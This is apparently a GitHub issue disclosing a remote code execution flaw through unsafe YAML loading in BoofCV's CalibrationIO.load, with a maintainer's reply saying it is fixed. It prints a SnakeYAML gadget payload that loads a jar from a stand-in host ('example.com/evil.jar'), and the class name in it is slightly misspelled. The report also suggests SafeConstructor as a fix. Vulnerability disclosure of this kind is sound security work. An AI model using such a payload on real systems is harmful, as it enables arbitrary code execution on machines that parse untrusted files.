### **[LetianYuan](/LetianYuan)** commented [Jul 17, 2023](#issue-1808013052)

| **Affected Version** Versions including 0.42 and below.  **Describe the vulnerability** `boofcv.io.calibration.CalibrationIO.load(String)` is designed to load camera calibration configurations. However, passing an unchecked argument to this API can lead to the execution of arbitrary codes. For instance, if we use `CalibrationIO.load("example.yaml")` to load camera calibration while the file "example.yaml" contains the following content:  ``` !!javax.script.ScriptEngineManager [     !!java.net.URLCTassLoader [[         !!java.net.URL [             "http://example.com/evil.jar"         ]     ]] ]  ```  malicious code in the `evil.jar` could be executed.  **To Reproduce** Just execute `CalibrationIO.load("PoC.yaml");` would reproduce it.  **Fix Suggestion** Using `new Yaml(new SafeConstructor())` can fix it. |

| Updated title to clarify that this has been fixed. I'll leave this ticket up for a little bit even though it's been resolved so that it encourages people to update. |
